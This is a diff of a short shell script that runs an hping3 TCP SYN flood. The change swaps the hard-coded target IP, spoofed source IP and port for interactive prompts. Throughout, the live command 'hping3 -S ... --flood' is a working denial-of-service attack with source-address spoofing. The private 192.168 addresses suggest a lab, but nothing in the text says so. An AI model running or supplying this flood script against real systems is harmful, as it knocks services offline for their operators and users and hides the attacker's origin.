@@ -23,12 +23,12 @@
 
 #echo "OK, confirm your are ROOT! :D";
 #echo "Proceeding Hping3 with TCP SYN Flood Mode :D";
-target='192.168.2.65';
-#read -p "Enter target IP [192.168.2.65]: " target;
-#read -p "Enter spoof IP [192.168.2.70]: " spoofAddr;
-spoofAddr='192.168.2.65';
-port='8082';
-#read -p "Enter target port [8081/8082/20145]: " port;
+#target='192.168.2.65';
+read -p "Enter target IP [192.168.2.65]: " target;
+read -p "Enter spoofed IP [192.168.2.70]: " spoofAddr;
+#spoofAddr='192.168.2.65';
+#port='8082';
+read -p "Enter target port [8081/8082/20145]: " port;
 
 #hping3 -S $target $spoofAddr -p $port --flood;
 hping3 -S $target $spoofAddr -p $port --flood;
